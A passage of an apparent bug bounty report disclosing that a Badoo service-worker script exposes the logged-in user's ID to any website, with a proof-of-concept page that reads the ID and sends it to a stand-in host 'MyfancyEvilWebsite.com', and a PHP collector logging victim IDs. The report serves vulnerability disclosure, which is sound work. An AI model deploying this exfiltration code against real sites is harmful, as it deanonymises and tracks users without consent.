This script `https://badoo.com/worker-scope/chrome-service-worker.js?ws=1` being contained information dependent on the currently logged in user .\n2. This information can identify the currently logged in user.\n3. The same script being public , and can be called and fetched by any rogue script on any website  .\n\n\n###What makes it an issue ?\n\nIt's considered as a privacy violation . If I visited some website , the website owner is not supposed to figure out my identity , but this issue allow him to do so .\n\nAdditionally the issue allows any one to figure out weather I'm logged in or logged out , and by which account .\n\n###How can any one exploit the issue maliciously ? \n\nLet's consider the following as an exploit scenario .\n\nI'm a commercial website owner who  found out about this issue and decided to take advantage to my new product advertisement campaign .\n\nSo , I designed a plan as following :\n\n1. Start a public and general campaign by setting up the new product page in my website and distributing the link to the page every where , including badoo .\n2. The new product page should contain the Exploit code written below .\n\n```\n\u003chtml\u003e\n\u003cscript src=https://badoo.com/worker-scope/chrome-service-worker.js?ws=1\u003e\u003c/script\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\u003cscript\u003e\nfunction UnmaskUser(str) {\nreturn str.split('=')[0];\n}\nwindow.onload = function(){\nvar user = UnmaskUser(user_id);\nvar xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://MyfancyEvilWebsite.com/identity-stealer.php?victim=' user , true);\nxhr.send();\n};\n\u003c/script\u003e\n\u003c/html\u003e\n```\nAnd the `identity-stealer.php` should have the code :\n```\n\u003c?php\n$user = $_GET['victim'];\n$fd = fopen(\"badoo-users-interested-in-my-product.txt\",\"a\");\n fwrite($fd, $user);\n fclose($fd);\n?\u003e\n```\n\n3. The people who may be interested in my new product will start to visit my new product page .\n4. After a period of time I will be having a txt file `badoo-users-interested-in-my-product.txt` on my server with a list of ids of all badoo users who have visited my new product page while they are logged into badoo .\n5. Now I can start a more specific and targeted advertisement campaign by contacting those badoo users directly by private messages or emails .\n\n\n##Note : \nThis should be clarified the matter , so if you still think this issue isn't considered a security issue or privacy violation you can close the report as informative .\n\n\nBest regards , \nThanks ,\n\nSaeed H.
